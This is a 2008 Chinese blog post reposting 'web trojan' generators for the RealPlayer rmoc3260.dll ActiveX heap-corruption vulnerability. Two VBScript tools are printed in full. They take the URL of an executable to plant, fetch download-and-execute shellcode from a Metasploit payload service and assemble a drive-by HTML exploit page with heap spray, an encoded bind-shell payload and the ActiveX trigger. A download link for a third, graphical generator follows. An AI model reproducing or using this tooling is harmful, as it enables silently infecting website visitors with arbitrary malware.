---
title: 3种版本的Real Player rmoc3260.dll ActiveX Control 网马生成器
description: 夜火：最近RealPlayerrmoc3260.dllActiveXControl的漏洞闹的很火，我一直没转相关的文章，今天在鬼仔那看到了相关的网马生成器，有2个网马生成器是lcx那发的，最后一个图形界面的是丰初写的网马生成器（带测试动画）
date: 2008-04-04 08:36:24
category: 漏洞信息
tags: ['0day', 'exploit', 'ActiveX', '网马', '生成器']
post_id: 437
alias: 3-kinds-of-Real-Player-rmoc3260.dll-ActiveX-Control
ViewNums: 5659
---

[夜火](/blog/)最近**Real Player rmoc3260.dll ActiveX Control** 的[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)闹的很火，我一直没转相关的文章，今天在[鬼仔](http://www.huaidan.org/blog/)那看到了相关的[网马](/tags/%E7%BD%91%E9%A9%AC)生成器，有2个网马[生成器](/tags/%E7%94%9F%E6%88%90%E5%99%A8)是lcx那发的，最后一个图形界面的是丰初写的网马生成器（带测试动画）

---------------------lcx那里发的---------------------------------------
作者：lcx
来源：vbs小铺

代码如下：

'以下代码保存成vbs，双击即可

On Error Resume Next
Exeurl = InputBox( "请输入exe的地址：", "输入", "http://www.haiyangtop.net/333.exe" )
url = "http://metasploit.com:55555/PAYLOADS?parent=GLOB%280x2b94a2879c50%29&MODULE=win32_downloadexec&MODE=GENERATE&OPT_URL="&URLEncoding(Exeurl)&"&MaxSize=&BadChars=0x00+&ENCODER=Msf%3A%3AEncoder%3A%3AAlpha2&ACTION=Generate+Payload"
Body = getHTTPPage(url)
Set Re = New RegExp
Re.Pattern = "($shellcode =[sS]+</div></pre>)"
Set Matches = Re.Execute(Body)
If Matches.Count>0 Then Body = Matches(0).value
code=Trim(Replace(Replace(replace(Replace(Replace(Replace(Replace(Body,"$shellcode =",""),Chr(34),""),Chr(13),""),";",""),"</div></pre>",""),Chr(10),""),".",""))

function replaceregex(str)
set regex=new regExp
regex.pattern="\x(..)\x(..)"
regex.IgnoreCase=true
regex.global=true
matches=regex.replace(str,"%u$2$1")
replaceregex=matches
end Function

Function getHTTPPage(Path)
 t = GetBody(Path)
 getHTTPPage = BytesToBstr(t, "GB2312")
End Function

Function GetBody(url)
 On Error Resume Next
 Set Retrieval = CreateObject("Microsoft.XMLHTTP")
 With Retrieval
 .Open "Get", url, False, "", ""
 .Send
 GetBody = .ResponseBody
 End With
 Set Retrieval = Nothing
End Function

Function BytesToBstr(Body, Cset)
 Dim objstream
 Set objstream = CreateObject("adodb.stream")
 objstream.Type = 1
 objstream.Mode = 3
 objstream.Open
 objstream.Write Body
 objstream.Position = 0
 objstream.Type = 2
 objstream.Charset = Cset
 BytesToBstr = objstream.ReadText
 objstream.Close
 Set objstream = Nothing
End Function

Function URLEncoding(vstrIn)
 strReturn = ""
 For aaaa = 1 To Len(vstrIn)
 ThisChr = Mid(vStrIn,aaaa,1)
 If Abs(Asc(ThisChr)) < &HFF Then
 strReturn = strReturn & ThisChr
 Else
 innerCode = Asc(ThisChr)
 If innerCode < 0 Then
 innerCode = innerCode + &H10000
 End If
 Hight8 = (innerCode And &HFF00) &HFF
 Low8 = innerCode And &HFF
 strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
 End If
 Next
 URLEncoding = strReturn
End Function

set fso=CreateObject("scripting.filesystemobject")
set fileS=fso.opentextfile("a.txt",8,true)
fileS.writeline replaceregex(code)
wscript.echo replaceregex(code)
files.close
set fso=Nothing

wscript.echo Chr(13)&"ok，生成a.txt，请用a.txt里的替换http://www.milw0rm.com/exploits/5332里的shellcode1内容即可"

------------------------------------另外一个版本-----------------------------------

On Error Resume Next
a=""
b=""
a=a+"<!-- " & vbcrlf
a=a+"Real Player rmoc3260.dll ActiveX Control Remote Code Execution Exploit(Heap Corruption)" & vbcrlf
a=a+"written by e.b." & vbcrlf
a=a+"Tested on Windows XP SP2(fully patched) English, IE6, rmoc3260.dll version 6.0.10.45" & vbcrlf
a=a+"Thanks to h.d.m. and the Metasploit crew" & vbcrlf
a=a+"-->" & vbcrlf
a=a+"<html>" & vbcrlf
a=a+" <head>" & vbcrlf
a=a+" <title>Real Player rmoc3260.dll ActiveX Control Remote Code Execution Exploit</title>" & vbcrlf
a=a+" <script language=""JavaScript"" defer>" & vbcrlf
a=a+" function Check() {" & vbcrlf
a=a+" " & vbcrlf
a=a+" " & vbcrlf
a=a+"" & vbcrlf
a=a+"" & vbcrlf
a=a+"// win32_exec - EXITFUNC=seh CMD=c:windowssystem32calc.exe Size=378 Encoder=Alpha2 http://metasploit.com " & vbcrlf

b=b+"" & vbcrlf
b=b+"// win32_bind - EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com " & vbcrlf
b=b+"var shellcode2 = unescape(""%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949"" +" & vbcrlf
b=b+" ""%u4949%u4949%u4949%u4949%u4949%u4937%u5a51%u436a"" +" & vbcrlf
b=b+" ""%u3058%u3142%u4150%u6b42%u4141%u4153%u4132%u3241"" +" & vbcrlf
b=b+" ""%u4142%u4230%u5841%u3850%u4241%u7875%u4b69%u724c"" +" & vbcrlf
b=b+" ""%u584a%u526b%u4a6d%u4a48%u6b59%u6b4f%u694f%u416f"" +" & vbcrlf
b=b+" ""%u4e70%u526b%u744c%u4164%u6e34%u376b%u5535%u4c6c"" +" & vbcrlf
b=b+" ""%u714b%u646c%u6145%u7468%u6a41%u6e4f%u626b%u326f"" +" & vbcrlf
b=b+" ""%u6c38%u334b%u376f%u5550%u7851%u316b%u6c59%u504b"" +" & vbcrlf
b=b+" ""%u6e34%u466b%u6861%u456e%u6f61%u6c30%u6c59%u6b6c"" +" & vbcrlf
b=b+" ""%u3934%u4150%u3764%u6877%u6941%u565a%u636d%u4b31"" +" & vbcrlf
b=b+" ""%u7872%u6c6b%u7534%u566b%u3134%u5734%u5458%u6b35"" +" & vbcrlf
b=b+" ""%u6e55%u336b%u556f%u7474%u7841%u416b%u4c76%u464b"" +" & vbcrlf
b=b+" ""%u626c%u6e6b%u416b%u354f%u564c%u6861%u666b%u3663"" +" & vbcrlf
b=b+" ""%u6c4c%u6b4b%u7239%u444c%u5764%u616c%u4f71%u4733"" +" & vbcrlf
b=b+" ""%u6b41%u336b%u4c54%u634b%u7073%u6c30%u534b%u6470"" +" & vbcrlf
b=b+" ""%u6c4c%u724b%u4550%u4e4c%u6c4d%u374b%u7530%u7358"" +" & vbcrlf
b=b+" ""%u426e%u4c48%u524e%u466e%u586e%u566c%u3930%u586f"" +" & vbcrlf
b=b+" ""%u7156%u4676%u7233%u6346%u3058%u7033%u3332%u5458"" +" & vbcrlf
b=b+" ""%u5237%u4553%u5162%u504f%u4b54%u5a4f%u3370%u6a58"" +" & vbcrlf
b=b+" ""%u686b%u596d%u456c%u466b%u4930%u596f%u7346%u4e6f"" +" & vbcrlf
b=b+" ""%u5869%u7365%u4d56%u5851%u366d%u6468%u7242%u7275"" +" & vbcrlf
b=b+" ""%u674a%u5972%u6e6f%u7230%u4a48%u5679%u6b69%u6e45"" +" & vbcrlf
b=b+" ""%u764d%u6b37%u584f%u3356%u3063%u5053%u7653%u7033"" +" & vbcrlf
b=b+" ""%u3353%u5373%u3763%u5633%u6b33%u5a4f%u3270%u5046"" +" & vbcrlf
b=b+" ""%u3568%u7141%u304c%u3366%u6c63%u6d49%u6a31%u7035"" +" & vbcrlf
b=b+" ""%u6e68%u3544%u524a%u4b50%u7177%u4b47%u4e4f%u3036"" +" & vbcrlf
b=b+" ""%u526a%u3130%u7041%u5955%u6e6f%u3030%u6c68%u4c64"" +" & vbcrlf
b=b+" ""%u546d%u796e%u3179%u5947%u596f%u4646%u6633%u6b35"" +" & vbcrlf
b=b+" ""%u584f%u6350%u4b58%u7355%u4c79%u4146%u6359%u4b67"" +" & vbcrlf
b=b+" ""%u784f%u7656%u5330%u4164%u3344%u7965%u4e6f%u4e30"" +" & vbcrlf
b=b+" ""%u7173%u5878%u6167%u6969%u7156%u6269%u3977%u6a6f"" +" & vbcrlf
b=b+" ""%u5176%u4945%u4e6f%u5130%u5376%u715a%u7274%u6246"" +" & vbcrlf
b=b+" ""%u3048%u3063%u6c6d%u5a49%u6345%u625a%u7670%u3139"" +" & vbcrlf
b=b+" ""%u5839%u4e4c%u4d69%u5337%u335a%u4e74%u4b69%u5652"" +" & vbcrlf
b=b+" ""%u4b51%u6c70%u6f33%u495a%u336e%u4472%u6b6d%u374e"" +" & vbcrlf
b=b+" ""%u7632%u6e4c%u6c73%u704d%u767a%u6c58%u4e6b%u4c4b"" +" & vbcrlf
b=b+" ""%u736b%u5358%u7942%u6d6e%u7463%u6b56%u304f%u7075"" +" & vbcrlf
b=b+" ""%u4b44%u794f%u5346%u706b%u7057%u7152%u5041%u4251"" +" & vbcrlf
b=b+" ""%u4171%u337a%u4231%u4171%u5141%u6645%u6931%u5a6f"" +" & vbcrlf
b=b+" ""%u5070%u6e68%u5a4d%u5679%u6865%u334e%u3963%u586f"" +" & vbcrlf
b=b+" ""%u6356%u4b5a%u4b4f%u704f%u4b37%u4a4f%u4c70%u614b"" +" & vbcrlf
b=b+" ""%u6b47%u4d4c%u6b53%u3174%u4974%u596f%u7046%u5952"" +" & vbcrlf
b=b+" ""%u4e6f%u6330%u6c58%u6f30%u577a%u6174%u324f%u4b73"" +" & vbcrlf
b=b+" ""%u684f%u3956%u386f%u4350"");" & vbcrlf
b=b+"" & vbcrlf
b=b+"" & vbcrlf
b=b+"  var bigblock = unescape(""%u0C0C%u0C0C"");" & vbcrlf
b=b+"  var headersize = 20;" & vbcrlf
b=b+"  var slackspace = headersize + shellcode1.length;" & vbcrlf
b=b+"  while (bigblock.length < slackspace) bigblock += bigblock;" & vbcrlf
b=b+"  var fillblock = bigblock.substring(0,slackspace);" & vbcrlf
b=b+"  var block = bigblock.substring(0,bigblock.length - slackspace);" & vbcrlf
b=b+"  while (block.length + slackspace < 0x40000) block = block + block + fillblock;" & vbcrlf
b=b+"" & vbcrlf
b=b+"  " & vbcrlf
b=b+"" & vbcrlf
b=b+"  var memory = new Array();" & vbcrlf
b=b+"  for (i = 0; i < 400; i++){ memory[i] = block + shellcode1 }" & vbcrlf
b=b+"  " & vbcrlf
b=b+"  var buf = '';" & vbcrlf
b=b+"  while (buf.length < 32) buf = buf + unescape(""%0C"");" & vbcrlf
b=b+"" & vbcrlf
b=b+"  var m = '';" & vbcrlf
b=b+"" & vbcrlf
b=b+"  m = obj.Console;" & vbcrlf
b=b+"  obj.Console = buf;" & vbcrlf
b=b+"  obj.Console = m;" & vbcrlf
b=b+"  " & vbcrlf
b=b+"  m = obj.Console;" & vbcrlf
b=b+"  obj.Console = buf;" & vbcrlf
b=b+"  obj.Console = m;" & vbcrlf
b=b+"  " & vbcrlf
b=b+"  " & vbcrlf
b=b+" } " & vbcrlf
b=b+" " & vbcrlf
b=b+" </script>" & vbcrlf
b=b+" " & vbcrlf
b=b+" " & vbcrlf
b=b+"</head>" & vbcrlf
b=b+" <body onload=""JavaScript: return Check();"">" & vbcrlf
b=b+"  <object classid=""clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93"" id=""obj"">" & vbcrlf
b=b+"    Unable to create object" & vbcrlf
b=b+"  </object>" & vbcrlf
b=b+"" & vbcrlf
b=b+" </body>" & vbcrlf
b=b+"</html>" & vbcrlf
b=b+"" & vbcrlf
b=b+"# milw0rm.com [2008-04-01]" & vbcrlf

Exeurl = InputBox( "请输入exe的地址：", "输入", "http://www.haiyangtop.net/333.exe" )
url = "http://metasploit.com:55555/PAYLOADS?parent=GLOB%280x2b94a2879c50%29&MODULE=win32_downloadexec&MODE=GENERATE&OPT_URL="&URLEncoding(Exeurl)&"&MaxSize=&BadChars=0x00+&ENCODER=Msf%3A%3AEncoder%3A%3AAlpha2&ACTION=Generate+Payload"
Body = getHTTPPage(url)
Set Re = New RegExp
Re.Pattern = "($shellcode =[sS]+</div></pre>)"
Set Matches = Re.Execute(Body)
If Matches.Count>0 Then Body = Matches(0).value
code=Trim(Replace(Replace(replace(Replace(Replace(Replace(Replace(Body,"$shellcode =",""),Chr(34),""),Chr(13),""),";",""),"</div></pre>",""),Chr(10),""),".",""))

function replaceregex(str)
set regex=new regExp
regex.pattern="\x(..)\x(..)"
regex.IgnoreCase=true
regex.global=true
matches=regex.replace(str,"%u$2$1")
replaceregex=matches
end Function

Function getHTTPPage(Path)
 t = GetBody(Path)
 getHTTPPage = BytesToBstr(t, "GB2312")
End Function

Function GetBody(url)
 On Error Resume Next
 Set Retrieval = CreateObject("Microsoft.XMLHTTP")
 With Retrieval
 .Open "Get", url, False, "", ""
 .Send
 GetBody = .ResponseBody
 End With
 Set Retrieval = Nothing
End Function

Function BytesToBstr(Body, Cset)
 Dim objstream
 Set objstream = CreateObject("adodb.stream")
 objstream.Type = 1
 objstream.Mode = 3
 objstream.Open
 objstream.Write Body
 objstream.Position = 0
 objstream.Type = 2
 objstream.Charset = Cset
 BytesToBstr = objstream.ReadText
 objstream.Close
 Set objstream = Nothing
End Function

Function URLEncoding(vstrIn)
 strReturn = ""
 For aaaa = 1 To Len(vstrIn)
 ThisChr = Mid(vStrIn,aaaa,1)
 If Abs(Asc(ThisChr)) < &HFF Then
 strReturn = strReturn & ThisChr
 Else
 innerCode = Asc(ThisChr)
 If innerCode < 0 Then
 innerCode = innerCode + &H10000
 End If
 Hight8 = (innerCode And &HFF00) &HFF
 Low8 = innerCode And &HFF
 strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
 End If
 Next
 URLEncoding = strReturn
End Function

set fso=CreateObject("scripting.filesystemobject")
set fileS=fso.opentextfile("a.txt",2,true)
fileS.writeline a
fileS.writeline "var shellcode1 = unescape(""" & replaceregex(code) & """);"
fileS.writeline b
files.close
set fso=Nothing

wscript.echo Chr(13)&"ok，生成a.txt"

------------------------------------丰初的图形界面的（带测试动画）-----------------------------------

![](http://pic.yupoo.com/sunlei/30046557d9e3/zlociwi3.jpg)

[下载地址](http://www.ziddu.com/downloadfile.php?uid=Zq6alZyla6qZm52ns6yZlJyiZa6WlJen5)

